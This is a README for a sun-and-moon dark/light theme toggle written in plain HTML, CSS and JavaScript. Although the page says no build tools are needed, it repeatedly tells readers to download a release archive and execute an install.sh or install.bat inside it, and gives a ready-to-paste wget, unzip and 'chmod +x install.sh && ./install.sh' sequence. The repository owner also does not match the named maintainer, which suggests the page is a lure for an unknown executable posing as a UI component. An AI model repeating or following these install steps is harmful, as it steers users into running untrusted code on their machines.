# Dark-Light Mode Toggle — Animated Sun & Moon UI Switch

[![Releases](https://img.shields.io/github/v/release/AskEveryone99/dark-light-mode?color=4c1&label=Releases&logo=github)](https://github.com/AskEveryone99/dark-light-mode/releases)

A modern dark/light mode toggle button with sun and moon icons. Animated transitions, sleek responsive layout, and simple HTML/CSS/JS. Customizable and beginner-friendly.

---

[![Demo badge](https://img.shields.io/badge/DOWNLOAD%20RELEASES-%20dark--light--mode-blue?logo=github&style=for-the-badge)](https://github.com/AskEveryone99/dark-light-mode/releases)

Quick links
- Repo: dark-light-mode
- Topics: codesbynitin, css, dark-light-mode, dark-mode, html, javascript, light-mode, theme-switch, theme-toggle, toggle-button, ui-components
- Releases: https://github.com/AskEveryone99/dark-light-mode/releases (download the release file and execute it)

Demo images
- Light mode preview  
  ![Sun Icon Demo](https://upload.wikimedia.org/wikipedia/commons/3/3b/Sun_symbol.svg)
- Dark mode preview  
  ![Moon Icon Demo](https://upload.wikimedia.org/wikipedia/commons/e/e1/Full_Moon.svg)

Why this toggle
- Small, focused UI component.
- Smooth animated transitions between themes.
- Works with plain HTML, CSS, and vanilla JavaScript.
- Customizable variables for colors, timing, and icons.
- Lightweight and accessible.

Features
- Animated sun-to-moon morph and motion.
- Theme persistence with localStorage.
- CSS custom properties for easy theme tuning.
- Keyboard accessible toggle and ARIA attributes.
- Responsive layout for mobile and desktop.
- No build tools required.

Files you will find
- index.html — demo page and usage example.
- styles.css — CSS with variables and animations.
- toggle.js — JavaScript that handles the toggle logic and persistence.
- assets/ — SVG icons and small images.
- README.md — this file.
- dist/ (optional) — packaged release files and install script.

Install and run (releases)
- Visit the releases page and download the release asset:
  https://github.com/AskEveryone99/dark-light-mode/releases
- Download the release file (for example dark-light-mode-v1.0.0.zip).
- Extract the archive.
- Execute the installer file inside the archive if present (install.sh on macOS/Linux or install.bat on Windows). If no installer is included, open index.html in a browser.

Example:
- Linux / macOS
  1. wget https://github.com/AskEveryone99/dark-light-mode/releases/download/v1.0.0/dark-light-mode-v1.0.0.zip
  2. unzip dark-light-mode-v1.0.0.zip
  3. cd dark-light-mode-v1.0.0
  4. chmod +x install.sh && ./install.sh
- Windows
  1. Download dark-light-mode-v1.0.0.zip from the releases page.
  2. Extract and double-click install.bat or open index.html.

If you prefer to clone and run locally
1. git clone https://github.com/AskEveryone99/dark-light-mode.git
2. cd dark-light-mode
3. Open index.html in a browser

Usage (embed the toggle)
1. Include the HTML snippet inside your page where you want the switch:

```html
<!-- Toggle -->
<button id="theme-toggle" aria-label="Toggle theme" aria-pressed="false">
  <span class="icon sun" aria-hidden="true"></span>
  <span class="icon moon" aria-hidden="true"></span>
</button>
```

2. Add CSS link and JS file:

```html
<link rel="stylesheet" href="styles.css">
<script defer src="toggle.js"></script>
```

3. The script will:
- Detect system preference.
- Apply saved theme from localStorage.
- Toggle theme on button click.
- Update ARIA attributes and CSS classes.

Customization guide
- Colors
  - Edit CSS variables in :root and [data-theme="dark"].
  - Example variables:
    --bg, --text, --accent, --toggle-bg, --transition-duration
- Animations
  - Change --transition-duration to speed up or slow down animations.
  - Edit keyframes in styles.css to adjust icon motion and transform.
- Icons
  - Replace icons in assets/ with your SVGs.
  - Keep accessible labels and aria-hidden attributes for decorative SVGs.
- Persistence
  - toggle.js uses localStorage key "dlm-theme".
  - You can change the key or storage method to integrate with server-side settings.

Accessibility
- Button has aria-label and aria-pressed attributes.
- The script manages keyboard focus and press state.
- Contrast colors are set for both themes using CSS variables.
- Use semantic HTML in your page for best results.

API (simple)
- toggleTheme() — toggles between 'light' and 'dark'.
- setTheme(theme) — sets theme to 'light' or 'dark'.
- getTheme() — returns current theme string.

Example JS usage
```js
// call from your script after toggle.js loads
document.getElementById('theme-toggle').addEventListener('click', () => {
  toggleTheme();
});

// set dark mode programmatically
setTheme('dark');
```

Demo scenarios
- Single page app: Add the toggle to the header and persist theme across routes.
- Static site: Drop the files into your site root and link styles.js.
- Component library: Import styles and the toggle.js logic to reuse across components.

File structure (example)
- /index.html
- /styles.css
- /toggle.js
- /assets/sun.svg
- /assets/moon.svg
- /README.md
- /dist/dark-light-mode-v1.0.0.zip

How it works (brief technical)
- CSS defines two sets of variables for light and dark.
- The root element receives data-theme="dark" when dark mode is active.
- Icons animate with CSS keyframes for rotation, scale, and opacity.
- JavaScript toggles the data attribute and writes to localStorage.
- On load, the script checks saved preference, then falls back to prefers-color-scheme.

Design notes
- Keep icon art simple and scalable (SVG).
- Use CSS variables for color mapping.
- Use reduced-motion media query for users who prefer no animation.
- Avoid inlining large SVGs if you reuse them across pages.

Contributing
- Fork the repo and open a pull request.
- Keep changes focused to one feature or fix.
- Add tests or demo pages for new behavior.
- Use clear commit messages and reference issues.

Releases and versions
- All packaged releases live on the releases page:
  https://github.com/AskEveryone99/dark-light-mode/releases
- Download the release file and execute the provided installer or open the demo file.
- Release assets include ZIP and TAR archives and may include install scripts.

Troubleshooting
- If the toggle does not change theme:
  - Check for JS errors in the console.
  - Ensure toggle.js loads with defer or at end of body.
  - Verify localStorage access is allowed.
- If icons do not show:
  - Confirm asset paths in CSS and HTML match your folder layout.
  - Replace asset paths with absolute or CDN links if needed.

Examples and patterns
- Use the toggle as a standalone widget in a header.
- Combine with CSS variables that define a color palette for your app.
- Pair with a theme-aware component library for full site theming.

Badges and SEO
- Use repository topics to surface this component in searches.
- Add the release badge at top to show latest version.
- Include keywords: dark mode, light mode, theme toggle, UI component, CSS toggle.

License
- MIT License. See LICENSE file in the repo for details.

Maintainers
- codesbynitin and community contributors.
- For release downloads and installables, visit:
  https://github.com/AskEveryone99/dark-light-mode/releases

Contact
- Open issues on GitHub for bugs and feature requests.
- Submit PRs for improvements or fixes.